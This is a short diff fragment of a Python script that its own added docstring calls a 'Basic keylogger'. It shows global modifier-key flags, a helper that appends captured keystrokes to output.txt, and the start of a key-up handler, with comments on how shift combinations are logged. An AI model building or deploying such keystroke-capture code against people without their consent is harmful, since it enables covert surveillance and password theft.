@@ -11,13 +11,22 @@ shift = False
 ctrl = False
 startTime = time.time()
 outFile = "output.txt"
-
+"""
+Basic keylogger
+Writes to the output file specified above.
+"""
 def writeOut(data):
 	fileName = outFile
 	f=open(outFile,'a')
 	f.write(data)
 	f.close()
 
+	
+"""
+Don't need to record the shift or ctrl key in the log,
+only need to record the combination of the two. Thus shift + any 
+letter will be recorded as a capitol letter.
+"""
 def onKeyUpEvent(event):
 	global shift
 	global ctrl
